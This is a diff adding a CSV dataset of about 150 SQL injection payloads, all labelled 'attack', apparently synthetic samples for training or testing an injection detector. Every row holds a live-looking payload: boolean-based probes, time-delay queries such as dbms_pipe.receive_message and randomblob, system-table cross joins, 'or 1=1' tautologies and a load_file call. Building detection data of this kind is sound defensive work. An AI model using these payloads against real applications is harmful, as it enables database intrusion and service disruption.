@@ -1,0 +1,201 @@
+id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
+SMOTE_000001,attack,boolean,-9311   )    )    or   (  5065  =  2572  )  *2572 and    (    (   1199  =  1199,nearest_attack_euclidean,R000102,1.1580790549119986
+SMOTE_000002,attack,boolean,"-4932%""   )    )    or   (  3076  =  5927  )  *5927 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000249,1.1086000812405523
+SMOTE_000003,attack,boolean,"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'dhoo' like 'dhoo",nearest_attack_euclidean,R000155,0.3595815309299517
+SMOTE_000004,attack,boolean,"1'   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000234,0.9594809743608567
+SMOTE_000005,attack,boolean,"1 where 7240  =  7240 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000129,0.16001697723236086
+SMOTE_000006,attack,boolean,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",nearest_attack_euclidean,R000250,0.9652908624111455
+SMOTE_000007,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000099,0.5271652882699144
+SMOTE_000008,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000199,0.8132439948560457
+SMOTE_000009,attack,boolean,"1%"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000140,2.4398360988246903
+SMOTE_000010,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000138,0.8006672487166722
+SMOTE_000011,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",nearest_attack_euclidean,R000045,0.32052230083554983
+SMOTE_000012,attack,boolean,1'  )   and   (  1471  =  7892  )  *7892 and   (  'kkok' like 'kkok,nearest_attack_euclidean,R000051,0.15519634227944207
+SMOTE_000013,attack,boolean,"1""  )   as gtpi where 8100  =  8100 and make_set  (  2678  =  9169,9169  )  --",nearest_attack_euclidean,R000031,0.23570040631026123
+SMOTE_000014,attack,boolean,"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000089,0.16341290366259523
+SMOTE_000015,attack,boolean,1   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  2197  =  2197,nearest_attack_euclidean,R000132,0.460514883474506
+SMOTE_000016,attack,boolean,"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",nearest_attack_euclidean,R000115,0.13186992433685055
+SMOTE_000017,attack,boolean,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000127,1.0819516168872576
+SMOTE_000018,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000104,0.8191552546866926
+SMOTE_000019,attack,boolean,"-3953  )   as wjjk where 6433  =  6433 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000232,0.37921962048294444
+SMOTE_000020,attack,boolean,"1  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000044,1.047349026177276
+SMOTE_000021,attack,boolean,"1  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  4557  =  4557",nearest_attack_euclidean,R000291,1.2620903017930543
+SMOTE_000022,attack,boolean,"1'   )    )    as ngoo where 8641  =  8641 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000055,0.97364916365615
+SMOTE_000023,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'qipt'  =  'qipt",nearest_attack_euclidean,R000072,0.08000326062113439
+SMOTE_000024,attack,boolean,1'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   'vvkd' like 'vvkd,nearest_attack_euclidean,R000308,0.5987949647797591
+SMOTE_000025,attack,boolean,"1  )   as iuje where 1976  =  1976 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R000264,0.2374746398202294
+SMOTE_000026,attack,boolean,"1' in boolean mode  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000018,1.187936310901017
+SMOTE_000027,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R000240,1.339639650785721
+SMOTE_000028,attack,boolean,"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000237,1.4118072007784712
+SMOTE_000029,attack,boolean,"1"" or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""kbex"" like ""kbex",nearest_attack_euclidean,R000143,1.8105163832672477
+SMOTE_000030,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'ltki'  =  'ltki,nearest_attack_euclidean,R000281,0.10071174362737233
+SMOTE_000031,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'qipt'  =  'qipt",nearest_attack_euclidean,R000072,0.5294172483030257
+SMOTE_000032,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""yzjl"" like ""yzjl",nearest_attack_euclidean,R000124,2.2251454724797597
+SMOTE_000033,attack,boolean,"1""  )   where 9359  =  9359 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000198,0.057922714402044925
+SMOTE_000034,attack,boolean,"-2414%""  )   or elt  (  1032  =  1032,3623  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000221,1.2926449969319407
+SMOTE_000035,attack,boolean,"1""   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000054,0.4591351799390225
+SMOTE_000036,attack,boolean,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",nearest_attack_euclidean,R000078,0.25246613465666023
+SMOTE_000037,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,nearest_attack_euclidean,R000312,1.057334975636721
+SMOTE_000038,attack,boolean,"1  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  4557  =  4557",nearest_attack_euclidean,R000291,0.6041695531311564
+SMOTE_000039,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000032,0.8339579877374287
+SMOTE_000040,attack,boolean,"1%'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000261,0.897841819980807
+SMOTE_000041,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'hvqt'  =  'hvqt",nearest_attack_euclidean,R000213,1.7669332798344295
+SMOTE_000042,attack,boolean,"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'dhoo' like 'dhoo",nearest_attack_euclidean,R000155,0.4320691561213768
+SMOTE_000043,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000087,0.49901725759789894
+SMOTE_000044,attack,boolean,"1'||  (  select 'fbsr' where 7899  =  7899 and elt  (  4249  =  4249,7259   )    )   ||'",nearest_attack_euclidean,R000113,0.0942169963797248
+SMOTE_000045,attack,boolean,"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000255,0.9284209833019437
+SMOTE_000046,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'atyf'  =  'atyf",nearest_attack_euclidean,R000236,0.16463882668170762
+SMOTE_000047,attack,boolean,"-6890""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ftho"" like ""ftho",nearest_attack_euclidean,R000205,2.0018799852260383
+SMOTE_000048,attack,boolean,-4557%'   )    )    or 4537  =  3401 and    (    (   '%'  =  ',nearest_attack_euclidean,R000193,0.8111080108743113
+SMOTE_000049,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000176,0.646070088360781
+SMOTE_000050,attack,boolean,"-3971%'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000035,0.8004432037456376
+SMOTE_000051,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",nearest_attack_euclidean,R000058,0.28617776276016565
+SMOTE_000052,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000290,1.8855753502988934
+SMOTE_000053,attack,boolean,"1'   )    )    as ngoo where 8641  =  8641 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000055,0.003934390039246776
+SMOTE_000054,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  1321  =  1321",nearest_attack_euclidean,R000152,0.04499497262901802
+SMOTE_000055,attack,boolean,"1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'lmoh' like 'lmoh",nearest_attack_euclidean,R000156,0.09457420278128982
+SMOTE_000056,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000032,0.8302904268997643
+SMOTE_000057,attack,boolean,"1""  )   as gtpi where 8100  =  8100 and make_set  (  2678  =  9169,9169  )  --",nearest_attack_euclidean,R000031,0.09555088214848431
+SMOTE_000058,attack,boolean,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000014,0.9722010966356268
+SMOTE_000059,attack,boolean,"1'   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000034,1.3584005075699623
+SMOTE_000060,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000186,0.4143480007332143
+SMOTE_000061,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000108,0.3658621904411804
+SMOTE_000062,attack,boolean,"1' where 2332  =  2332 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000043,0.03444777457166108
+SMOTE_000063,attack,boolean,"1'   )    )    as qzyp where 5081  =  5081 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000207,0.006861613485946863
+SMOTE_000064,attack,boolean,"1'   )    )    and elt  (  6847  =  5874,5874  )   and    (    (   'yspu'  =  'yspu",nearest_attack_euclidean,R000103,0.010430114010323755
+SMOTE_000065,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""rukx"" like ""rukx",nearest_attack_euclidean,R000196,0.5625101524846171
+SMOTE_000066,attack,boolean,"1'   )    )    as vqrt where 5173  =  5173 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000173,0.1733835826969316
+SMOTE_000067,attack,boolean,"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'ireg' like 'ireg",nearest_attack_euclidean,R000202,1.2204374756611207
+SMOTE_000068,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000284,1.0969243032689175
+SMOTE_000069,attack,boolean,"-7731""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""unly"" like ""unly",nearest_attack_euclidean,R000093,0.8609472778477208
+SMOTE_000070,attack,boolean,"-8810'  )   or make_set  (  9354  =  9354,7185  )   and   (  'prsn' like 'prsn",nearest_attack_euclidean,R000063,1.1139682110213314
+SMOTE_000071,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000114,1.380414982635475
+SMOTE_000072,attack,boolean,"1' in boolean mode  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000172,0.5317431036669145
+SMOTE_000073,attack,boolean,"-3649""   )    )    as eydu where 3220  =  3220 or elt  (  8705  =  1510,1510  )  --",nearest_attack_euclidean,R000175,0.4889381701159282
+SMOTE_000074,attack,boolean,"1%""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000026,1.2854731157160988
+SMOTE_000075,attack,boolean,"-8810'  )   or make_set  (  9354  =  9354,7185  )   and   (  'prsn' like 'prsn",nearest_attack_euclidean,R000063,0.7301102796699883
+SMOTE_000076,attack,boolean,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000003,1.5139435880048775
+SMOTE_000077,attack,boolean,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'vxqs'  =  'vxqs",nearest_attack_euclidean,R000042,0.30745168363237346
+SMOTE_000078,attack,boolean,"1%' or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000071,0.11769607563982817
+SMOTE_000079,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000167,0.6188426639116535
+SMOTE_000080,attack,boolean,"1%'   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000223,0.8040762717157607
+SMOTE_000081,attack,boolean,"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'imqi'  =  'imqi",nearest_attack_euclidean,R000231,0.37439246264187437
+SMOTE_000082,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'atyf'  =  'atyf",nearest_attack_euclidean,R000236,0.04065468695143238
+SMOTE_000083,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""rukx"" like ""rukx",nearest_attack_euclidean,R000196,0.5664101876893495
+SMOTE_000084,attack,boolean,1'   )    )    and 3355  =  6012 and    (    (   'ofmy'  =  'ofmy,nearest_attack_euclidean,R000247,0.35695874338240013
+SMOTE_000085,attack,boolean,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000127,1.729242920664172
+SMOTE_000086,attack,boolean,"1'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'nbsr' like 'nbsr",nearest_attack_euclidean,R000280,0.9962440934169604
+SMOTE_000087,attack,boolean,"-1162""   )    )    as mhmh where 8710  =  8710 or make_set  (  4822  =  7598,7598  )  --",nearest_attack_euclidean,R000302,0.9603194367871808
+SMOTE_000088,attack,boolean,1  )   where 5944  =  5944 and   (  4446  =  8843  )  *8843--,nearest_attack_euclidean,R000174,1.0422986483375902
+SMOTE_000089,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'teng' like 'teng",nearest_attack_euclidean,R000064,1.249958981641718
+SMOTE_000090,attack,boolean,"-1084 where 1181  =  1181 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000112,0.2897932951614203
+SMOTE_000091,attack,boolean,"-4350""   )    )    as mmwq where 9801  =  9801 or   (  8520  =  2834  )  *2834--",nearest_attack_euclidean,R000184,1.0163394440419364
+SMOTE_000092,attack,boolean,"-2790""   )    )    as vcvw where 6075  =  6075 or 7078  =  8148--",nearest_attack_euclidean,R000238,0.81333327569752
+SMOTE_000093,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  8489  =  8820  )   then 1 else 0x28 end   )    )    and    (    (   'fbjf'  =  'fbjf,nearest_attack_euclidean,R000139,0.0984080531334805
+SMOTE_000094,attack,boolean,"-2790""   )    )    as vcvw where 6075  =  6075 or 7078  =  8148--",nearest_attack_euclidean,R000238,0.5213376423750099
+SMOTE_000095,attack,boolean,"1' in boolean mode  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000018,0.30795429270499464
+SMOTE_000096,attack,boolean,"1%'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000123,0.19172447418731378
+SMOTE_000097,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000099,0.8100302208922762
+SMOTE_000098,attack,boolean," select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",nearest_attack_euclidean,R000002,1.462981633810955
+SMOTE_000099,attack,boolean,"-3649""   )    )    as eydu where 3220  =  3220 or elt  (  8705  =  1510,1510  )  --",nearest_attack_euclidean,R000175,0.7132540723343316
+SMOTE_000100,attack,boolean,"1"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000068,0.8223002486332669
+SMOTE_000101,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'nkte'  =  'nkte",nearest_attack_euclidean,R000105,0.5773101677581428
+SMOTE_000102,attack,boolean,"-2912""  )   as eizh where 2223  =  2223 or make_set  (  1041  =  3056,3056  )  --",nearest_attack_euclidean,R000168,0.26234753839278563
+SMOTE_000103,attack,boolean," select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",nearest_attack_euclidean,R000002,0.9726441406467896
+SMOTE_000104,attack,boolean,"1"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and ""qfhv""  =  ""qfhv",nearest_attack_euclidean,R000197,0.47952800883646757
+SMOTE_000105,attack,boolean,"-8791""   )    )     )   or make_set  (  6681  =  6620,6620  )   and    (    (     (  ""pvdk""  =  ""pvdk",nearest_attack_euclidean,R000025,1.0471260879467386
+SMOTE_000106,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  'ojkd'  =  'ojkd",nearest_attack_euclidean,R000165,1.4437008338293447
+SMOTE_000107,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000076,0.6678353284323598
+SMOTE_000108,attack,boolean,"1  )   where 7485  =  7485 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000109,0.5178883171330365
+SMOTE_000109,attack,boolean,"-9672'   )    )    as rupb where 8218  =  8218 or make_set  (  4954  =  1836,1836  )  --",nearest_attack_euclidean,R000059,1.1571105975197187
+SMOTE_000110,attack,boolean,"1'   )    )    as tfub where 3461  =  3461 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000091,0.5150483806613104
+SMOTE_000111,attack,boolean,-5067'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'vkab' like 'vkab,nearest_attack_euclidean,R000285,0.10443241983165436
+SMOTE_000112,attack,boolean,"-2912""  )   as eizh where 2223  =  2223 or make_set  (  1041  =  3056,3056  )  --",nearest_attack_euclidean,R000168,0.21721363131220137
+SMOTE_000113,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R000240,1.7509547875278562
+SMOTE_000114,attack,boolean,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000214,0.31381683326662974
+SMOTE_000115,attack,boolean,"1%'   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000256,0.7495071082248619
+SMOTE_000116,attack,boolean,"1"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000210,1.5353144850157234
+SMOTE_000117,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'teng' like 'teng",nearest_attack_euclidean,R000064,0.072024955297154
+SMOTE_000118,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  'ojkd'  =  'ojkd",nearest_attack_euclidean,R000165,1.7675361123545745
+SMOTE_000119,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""unju""  =  ""unju",nearest_attack_euclidean,R000219,1.4243445947613125
+SMOTE_000120,attack,boolean,1%'   )    )    rlike   (  select   (  case when   (  6094  =  7893  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',nearest_attack_euclidean,R000262,0.2904344170121293
+SMOTE_000121,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240",nearest_attack_euclidean,R000012,1.362118198744363
+SMOTE_000122,attack,boolean,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'cysu' like 'cysu",nearest_attack_euclidean,R000141,0.024582527800611265
+SMOTE_000123,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000104,0.6821099684552184
+SMOTE_000124,attack,boolean,"1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000276,0.7915974359576728
+SMOTE_000125,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""ekbq""  =  ""ekbq",nearest_attack_euclidean,R000192,0.04826230534724122
+SMOTE_000126,attack,boolean,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000028,0.8578328649118424
+SMOTE_000127,attack,boolean,"1'   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000034,0.33021917072887347
+SMOTE_000128,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000006,0.3278728328774586
+SMOTE_000129,attack,boolean,"1'  )   where 7646  =  7646 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000073,0.5517131986358407
+SMOTE_000130,attack,boolean,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",nearest_attack_euclidean,R000134,1.5032891785770932
+SMOTE_000131,attack,boolean,"-8025""  )   or   (  1436  =  4186  )  *4186 and   (  ""sqwv"" like ""sqwv",nearest_attack_euclidean,R000040,0.9327866195947794
+SMOTE_000132,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'qipt'  =  'qipt",nearest_attack_euclidean,R000072,0.0811784800141864
+SMOTE_000133,attack,boolean,1'   )    )     )   and   (  8982  =  8027  )  *8027 and    (    (     (  'qkrv'  =  'qkrv,nearest_attack_euclidean,R000126,0.38240192231773523
+SMOTE_000134,attack,boolean,"1"" or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""jtgs"" like ""jtgs",nearest_attack_euclidean,R000133,2.1193687162579558
+SMOTE_000135,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000065,0.04469926449567288
+SMOTE_000136,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",nearest_attack_euclidean,R000060,0.23029423614544425
+SMOTE_000137,attack,boolean,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000074,1.1442488632619758
+SMOTE_000138,attack,boolean,"1'+  (  select kqac where 4362  =  4362 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000036,0.556488337518103
+SMOTE_000139,attack,boolean,"1""   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000054,0.20190986946140738
+SMOTE_000140,attack,boolean,"-7119""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""rmzm""  =  ""rmzm",nearest_attack_euclidean,R000212,0.26176839867314244
+SMOTE_000141,attack,boolean,"1%'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000230,0.9521003129033758
+SMOTE_000142,attack,boolean,"1'   )    )    as babx where 2494  =  2494 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000146,0.7348320577955502
+SMOTE_000143,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'bhlx' like 'bhlx",nearest_attack_euclidean,R000125,0.8649870857869133
+SMOTE_000144,attack,boolean,"-8791""   )    )     )   or make_set  (  6681  =  6620,6620  )   and    (    (     (  ""pvdk""  =  ""pvdk",nearest_attack_euclidean,R000025,0.0002145922923398795
+SMOTE_000145,attack,boolean,"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000237,0.21582746884838344
+SMOTE_000146,attack,boolean,-8538%' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and '%'  =  ',nearest_attack_euclidean,R000295,0.332791102362048
+SMOTE_000147,attack,boolean,-2361'   )    )    as mzhv where 2905  =  2905 or 9026  =  5388--,nearest_attack_euclidean,R000179,0.8337861078388579
